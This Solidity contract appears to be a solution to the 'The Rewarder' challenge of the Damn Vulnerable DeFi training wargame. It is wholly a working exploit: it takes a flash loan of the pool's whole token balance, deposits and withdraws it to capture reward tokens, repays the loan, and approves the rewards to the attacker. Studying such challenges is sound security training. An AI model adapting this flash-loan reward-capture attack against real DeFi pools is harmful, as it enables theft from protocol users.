// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";



contract RewarderAttacker{

    address owner;
    FlashLoanerPool flashPool;
    DamnValuableToken public immutable DVT;
    TheRewarderPool theRewarder;
    RewardToken public immutable rwt;

    constructor(
        FlashLoanerPool _flashPool,
        DamnValuableToken _DVT, 
        TheRewarderPool _theRewarder,
        RewardToken _rwt,
        address _owner
        ) {
        require(_flashPool != FlashLoanerPool(address(0)));
        require(address(_DVT) != address(0));
        require(address(_theRewarder) != address(0));
        flashPool = _flashPool;
        DVT = _DVT;
        theRewarder = _theRewarder;
        rwt = _rwt;
        owner = _owner;
    }

    function caller() 
    external {
        flashPool.flashLoan(DVT.balanceOf(address(flashPool)));
    }

    function receiveFlashLoan(uint256 amount) 
    external 
    returns(uint256) {
        uint256 dvtBal = DVT.balanceOf(address(this));
        require(dvtBal > 0);
        DVT.approve(address(theRewarder), dvtBal);

        theRewarder.deposit(dvtBal);
        theRewarder.withdraw(dvtBal);

        DVT.transfer(address(flashPool), dvtBal);
        rwt.approve(owner, rwt.balanceOf(address(this)));
        return amount;
    }
}